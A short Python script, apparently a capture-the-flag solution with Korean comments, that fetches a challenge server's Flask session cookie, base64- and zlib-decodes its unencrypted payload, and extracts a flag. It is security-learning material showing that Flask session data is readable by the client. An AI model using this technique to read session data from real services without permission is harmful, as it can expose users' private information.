import re
from requests import request as req
import zlib
import base64

# GET / 요청
res = req(
    url="http://34.170.146.252:53703",
    method="GET",
)

session = res.cookies["session"]

# payload 부분 추출
session_header = "." + session.split(".")[1]

"""
패딩 보정 문자 ===
Flask 세션 쿠키는 용량을 줄이기 위해 뒤에 붙는 =를 모두 제거하고 전송.
제거된 =를 채워 4의 배수 base64 길이를 맞춰주기 위함.
최대 필요 개수인 3개 ===를 붙여서 길이를 강제로 맞춰주면, 필요 없는 =는 라이브러리가 알아서 무시한다.

urlsafe_b64decode 사용이유
base64에는 +와 /가 포함될 수 있는데, 이 문자들은 URL에서 특수한 의미로 쓰여 혼동을 줄 수 있음
Flask는 +를 -로, /를 _로 바꿔서 쿠키에 저장한다.
urlsafe_b64decode 통해 변형된 -와 _를 다시 원래대로 복원한다.
"""
decoded = base64.urlsafe_b64decode(session_header + "===")
data = zlib.decompress(decoded).decode("utf-8")

matched = re.search("Alpaca\\{.*?\\}", data)
print(matched.group() if matched else "NO FLAG")
